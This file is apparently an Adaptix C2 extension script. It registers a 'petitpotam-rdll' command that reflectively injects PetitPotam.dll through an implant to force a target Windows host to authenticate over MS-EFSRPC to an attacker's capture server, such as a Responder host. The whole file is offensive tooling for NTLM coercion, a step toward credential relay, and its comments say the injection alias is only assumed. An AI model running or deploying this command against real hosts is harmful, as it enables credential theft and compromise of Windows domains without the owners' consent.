var metadata = {
    name: "PetitPotam-RDLL",
    description: "Coerce Windows hosts to authenticate via MS-EFSRPC (reflective DLL)"
};

// NOTE: Reflective DLL injection uses a different Adaptix API than BOFs.
// The execute_alias command for reflective DLL is "execute dll" if supported,
// or the agent-specific inject command. Verify against your Adaptix version.
// The BOF variant (petitpotam.axs) is preferred and does not require this.
var cmd_petitpotam_rdll = ax.create_command("petitpotam-rdll", "Coerce Windows hosts to authenticate to another machine via MS-EFSRPC (reflective DLL)", "petitpotam-rdll <capture-server> <target-server>");
cmd_petitpotam_rdll.addArgString("captureserver", true, "IP or hostname of the capture/listener server (e.g. Responder host)");
cmd_petitpotam_rdll.addArgString("target",        true, "IP or hostname of the target server to coerce");
cmd_petitpotam_rdll.setPreHook(function (id, cmdline, parsed_json) {
    var captureserver = parsed_json["captureserver"];
    var target        = parsed_json["target"];
    var dll_path      = ax.script_dir() + "PetitPotam.dll";
    var params        = captureserver + " " + target;
    // "execute dll" is the assumed Adaptix alias for reflective DLL injection.
    // Replace with the correct verb if your Adaptix build uses a different one.
    ax.execute_alias(id, cmdline, `execute dll "${dll_path}" "${params}"`, `Task: PetitPotam RDLL coerce ${target} → ${captureserver}`);
});

var group_petitpotam_rdll = ax.create_commands_group("PetitPotam-RDLL", [cmd_petitpotam_rdll]);
ax.register_commands_group(group_petitpotam_rdll, ["beacon", "gopher", "kharon"], ["windows"], []);
